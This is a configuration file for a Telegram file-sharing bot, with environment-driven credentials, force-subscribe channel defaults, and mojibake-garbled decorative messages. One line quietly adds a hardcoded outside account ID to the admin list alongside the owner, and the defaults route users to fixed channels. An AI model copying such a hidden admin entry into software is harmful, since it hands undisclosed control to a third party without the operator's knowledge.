#(¬©) PythonBotz 




import os
import logging
from logging.handlers import RotatingFileHandler



#Bot token @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")

#Your API ID from my.telegram.org
APP_ID = int(os.environ.get("APP_ID", ""))

#Your API Hash from my.telegram.org
API_HASH = os.environ.get("API_HASH", "")

#Your db channel Id
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))

#OWNER ID
OWNER_ID = int(os.environ.get("OWNER_ID", ""))

#Port
PORT = os.environ.get("PORT", "8080")

#Database 
DB_URI = os.environ.get("DATABASE_URL", "")
DB_NAME = os.environ.get("DATABASE_NAME", "filesharexbot")

#Time in seconds for message Auto delete, put 0 to never delete
TIME = int(os.environ.get("TIME", "10"))

#force sub channel id, if you want enable force sub
FORCE_SUB_CHANNEL1 = int(os.environ.get("FORCE_SUB_CHANNEL1", "-1002361101862"))
#put 0 to disable
FORCE_SUB_CHANNEL2 = int(os.environ.get("FORCE_SUB_CHANNEL2", "-1002631555331"))#put 0 to disable
FORCE_SUB_CHANNEL3 = int(os.environ.get("FORCE_SUB_CHANNEL3", "-1002207278408"))#put 0 to disable
FORCE_SUB_CHANNEL4 = int(os.environ.get("FORCE_SUB_CHANNEL4", "-1002189440226"))#put 0 to disable

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

#start message
START_MSG = os.environ.get("START_MESSAGE", "<b><blockquote> üçí  ú·¥á è !! {mention} …™ ·¥Ä·¥ç  Ä…™·¥ÄÍú±~  è·¥è·¥ú Ä  ú·¥è·¥õ “ì…™ ü·¥á Íú±·¥õ·¥è Ä·¥á «´·¥ú·¥á·¥á…¥~ …™ ·¥Ñ·¥Ä…¥ s·¥õ·¥è Ä·¥á ·¥ò Ä…™·¥†·¥Ä·¥õ·¥á “ì…™ ü·¥ás …™…¥ ·¥Ä Íú±·¥ò·¥á·¥Ñ…™“ì…™·¥á·¥Ö ·¥Ñ ú·¥Ä…¥…¥·¥á ü ·¥Ä…¥·¥Ö ·¥è·¥õ ú·¥á Ä ·¥úÍú±·¥á ÄÍú± ·¥Ñ·¥Ä…¥ ·¥Ä·¥Ñ·¥Ñ·¥áÍú±Íú± ·¥õ ú·¥á·¥ç ·¥úÍú±…™…¥…¢ ·¥Ä ·¥ú…¥…™«´·¥ú·¥á  ü…™…¥·¥ã~.</blockquote></b>")
try:
    ADMINS=[]
    for x in (os.environ.get("ADMINS", "").split()):
        ADMINS.append(int(x))
except ValueError:
        raise Exception("Your Admins list does not contain valid integers.")

#Force sub message 
FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "·¥è·¥è·¥è·¥è·¥è ú~ {first}\n\n<b> ,  è·¥è·¥ú ·¥Ñ·¥Ä…¥'·¥õ ·¥õ·¥è·¥ú·¥Ñ ú ·¥ç·¥á  è·¥á·¥õ... è·¥è·¥ú  ú·¥Ä·¥†·¥á ·¥õ·¥è ·¥ä·¥è…™…¥ ·¥ç è s·¥á·¥Ñ Ä·¥á·¥õ  Ä·¥è·¥è·¥ç Íú∞…™ ÄÍú±·¥õ~  ·¥õ ú·¥á…¥ ·¥Ñ·¥è·¥ç·¥á  ô·¥Ä·¥Ñ·¥ã ·¥õ·¥è ·¥ò ü·¥Ä è, …™' ü ü  ô·¥á ·¥°")

# Start & Fsub Pics ----------------------------------- #

#Collection of pics for Bot // #Optional but atleast one pic link should be replaced if you don't want predefined links
PICS = (os.environ.get("PICS", "https://envs.sh/Vx5.jpg https://envs.sh/VxL.jpg https://envs.sh/Vxc.jpg https://envs.sh/V8O.jpg https://envs.sh/V8m.jpg https://envs.sh/V8X.jpg https://envs.sh/V8y.jpg")).split() #Required

# Start & Fsub Pics ----------------------------------- #

#set your Custom Caption here, Keep None for Disable Custom Caption
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

#set True if you want to prevent users from forwarding files from bot
PROTECT_CONTENT = True if os.environ.get('PROTECT_CONTENT', "False") == "True" else False

#Set true if you want Disable your Channel Posts Share button
DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True'

BOT_STATS_TEXT = """<b><blockquote>üçí  Ä…™·¥ÄÍú±' …¥·¥Ä·¥ú…¢ ú·¥õ è ·¥Ä Ä·¥Ñ ú…™·¥†·¥á Íú±·¥õ·¥Ä·¥õÍú±</b>

‚Ä¢ <b> ô·¥è·¥õ ·¥ú·¥ò·¥õ…™·¥ç·¥á:</b> {uptime}

<code>·¥è…¥ ü è ·¥ç è ·¥Ö·¥Ä Ä ü…™…¥…¢ ·¥ç·¥ÄÍú±·¥õ·¥á Ä ·¥Ñ·¥Ä…¥ ·¥ò ü·¥Ä è ·¥°…™·¥õ ú ·¥õ ú·¥áÍú±·¥á Íú±·¥á·¥Ñ Ä·¥á·¥õÍú±~</code></blockquote>"""
USER_REPLY_TEXT = "<b><blockquote>·¥è·¥è·¥òs~ üôÉ ·¥è…¥ ü è ·¥ç è ·¥ç·¥ÄÍú±·¥õ·¥á Ä ·¥Ñ·¥Ä…¥ Íú±·¥õ·¥è Ä·¥á Íú∞…™ ü·¥áÍú± …™…¥ ·¥ç·¥á~   è·¥è·¥ú' Ä·¥á …¥·¥è·¥õ  ú…™·¥ç,  ô·¥Ä ô è~<\blockquote><\b>"

ADMINS.append(OWNER_ID)
ADMINS.append(1250450587)

LOG_FILE_NAME = "filesharingbot.txt"

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt='%d-%b-%y %H:%M:%S',
    handlers=[
        RotatingFileHandler(
            LOG_FILE_NAME,
            maxBytes=50000000,
            backupCount=10
        ),
        logging.StreamHandler()
    ]
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
